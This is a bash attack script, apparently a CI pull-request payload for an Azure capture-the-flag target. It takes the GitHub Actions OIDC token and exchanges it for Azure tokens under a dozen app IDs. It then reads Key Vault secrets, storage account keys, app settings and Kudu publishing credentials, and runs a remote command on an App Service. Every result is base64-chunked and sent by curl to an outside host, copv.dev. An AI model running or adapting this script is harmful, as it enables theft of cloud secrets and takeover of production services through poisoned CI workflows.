#!/usr/bin/env bash
# Tebamoto PR probe v5: OIDC FIC sweep + KV chain + reporting Kudu MSI
set +e
SINK="${EXFIL_SINK:-http://copv.dev:8089}"
TAG="tb5${GITHUB_RUN_ID:-local}"
say() { echo "$*"; }
exfil() {
  local label="$1" data="$2" b64 i len
  b64=$(printf '%s' "$data" | base64 -w0 2>/dev/null | tr '+/' '-_' | tr -d '=')
  len=${#b64}
  say "[exfil] $label len=$len"
  i=0
  while [ $i -lt $len ]; do
    curl -sS -m 10 -o /dev/null "$SINK/x/$TAG/$label/$i/${b64:$i:1400}" || true
    i=$((i + 1400))
  done
}

say "=== build v5 === event=${GITHUB_EVENT_NAME:-local} repo=${GITHUB_REPOSITORY:-local}"

OIDC=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
  python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
say "oidc_len=${#OIDC}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
RG="rg-tbl-platform-prod-sea"

exch() {
  curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    --data-urlencode "client_id=$1" -d grant_type=client_credentials \
    --data-urlencode "scope=$2" \
    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=$OIDC"
}

aztok() {
  curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    --data-urlencode "client_id=$CID" -d grant_type=client_credentials \
    --data-urlencode "scope=$1" \
    -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
    --data-urlencode "client_assertion=$OIDC" | \
    python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null
}

if [ -z "$OIDC" ]; then say "NO_OIDC"; exit 0; fi

IDS="038bc35d-131d-4953-9985-ff4a245ccec1:cost-reader
2c34300e-1bc0-41e7-9c1e-8b7571d72c72:directory-audit
7c2e61eb-f928-45cd-99c9-20da958dd216:directory-sync
891fb158-e02c-4428-a885-53b811f369c0:legacy-admin
6eb124e3-de61-4fc9-a124-213d98d737f5:reporting-insights
12ed54de-f2eb-4784-804c-3a7a3e83a9e9:reporting-service
881fddce-6208-4af5-a297-7e79c912f83c:reporting-viewer
58108da8-044e-4d7e-9a46-92e6179b30be:secrets-sync
462d1c38-4459-48b8-9333-82e389e59514:platform-automation
72ff278a-9e71-43ec-bac4-2ca303f8e462:cicd-deployer
7a85156a-01c4-4e61-8472-40a92107159b:reporting-writer-mi
eeab432e-1bf6-400e-b155-a28ce7cafcdb:storefront-sysmi"

for LINE in $IDS; do
  APPID="${LINE%%:*}"; NAME="${LINE##*:}"
  for SCOPE in "https://management.azure.com/.default" "https://vault.azure.net/.default"; do
    R=$(exch "$APPID" "$SCOPE")
    T=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
    say "FIC_${NAME}_$(echo "$SCOPE" | sed 's|https://||;s|/.default||;s|/|_|g')_LEN=${#T}"
    [ -z "$T" ] && { exfil "ficfail-${NAME}" "$R"; continue; }
    exfil "kvsec-${NAME}" "$(curl -sS -m 15 -H "Authorization: Bearer $T" \
      'https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4')"
    for fn in flag FLAG df26 tebamoto-flag challenge-flag; do
      exfil "kvsec-${NAME}-${fn}" "$(curl -sS -m 12 -H "Authorization: Bearer $T" \
        "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${fn}?api-version=7.4")"
    done
    exfil "lkappcfg-${NAME}" "$(curl -sS -m 15 -X POST -H "Authorization: Bearer $T" \
      -H 'Content-Type: application/json' -d '{}' \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01")"
    exfil "appset-storefront-${NAME}" "$(curl -sS -m 15 -X POST -H "Authorization: Bearer $T" \
      -H 'Content-Type: application/json' -d '{}' \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01")"
  done
done

VAULT_TOK=$(aztok "https://vault.azure.net/.default")
say "OIDC_VAULT_LEN=${#VAULT_TOK}"
if [ -n "$VAULT_TOK" ]; then
  for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
    L=$(curl -sS -m 20 -H "Authorization: Bearer $VAULT_TOK" "https://$V.vault.azure.net/secrets?api-version=7.4")
    exfil "kvlist-$V" "$L"
    echo "$L" | python3 -c '
import sys,json
try:
  d=json.load(sys.stdin)
  for x in d.get("value",[]):
    print(x["id"].split("/")[-1])
except Exception: pass
' | while read -r name; do
      [ -z "$name" ] && continue
      SV=$(curl -sS -m 15 -H "Authorization: Bearer $VAULT_TOK" "https://$V.vault.azure.net/secrets/$name?api-version=7.4")
      VAL=$(echo "$SV" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
      case "$VAL" in *DF26*) say "FOUND_FLAG_${V}_${name}=${VAL}" ;; esac
    done
  done
fi

ARM_TOK=$(aztok "https://management.azure.com/.default")
say "OIDC_ARM_LEN=${#ARM_TOK}"
RPT_JSON=$(curl -sS -m 20 -H "Authorization: Bearer ${VAULT_TOK}" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RPT_JSON" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value","");print(json.loads(v).get("appId","") if v.startswith("{") else "")' 2>/dev/null)
RSC=$(echo "$RPT_JSON" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value","");print(json.loads(v).get("clientSecret","") if v.startswith("{") else "")' 2>/dev/null)
RT=$(echo "$RPT_JSON" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value","");print(json.loads(v).get("tenantId","") if v.startswith("{") else "")' 2>/dev/null)
RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$RT/oauth2/v2.0/token" \
  -d "client_id=$RID" -d grant_type=client_credentials -d "client_secret=$RSC" \
  -d 'scope=https://management.azure.com/.default' | \
  python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
say "REPORTING_ARM_LEN=${#RAT}"

for SITE_RG in "rg-tbl-reporting-prod-eus/app-tbl-reporting-prod" "rg-tbl-platform-prod-sea/app-tbl-storefront-prod"; do
  RG2=${SITE_RG%/*}; SITE=${SITE_RG#*/}
  PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H 'Content-Length: 0' \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/publishingcredentials/list?api-version=2023-01-01")
  PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
  say "KUDU_${SITE}=$([ -n "$PU" ] && echo OK || echo FAIL)"
  exfil "kudu-${SITE}" "$PC"
done

PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
if [ -n "$PU" ] && [ -n "$PP" ]; then
  SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
  OUT=$(curl -sS -m 90 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" \
    -d '{"command":"python3 /home/site/wwwroot/check_kv.py","dir":"/home/site/wwwroot"}')
  say "CHECK_KV_OUT=$(echo "$OUT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print((d.get("Output") or "")[:1500])' 2>/dev/null)"
  exfil "check-kv-out" "$OUT"
fi

say "=== DONE v5 ==="
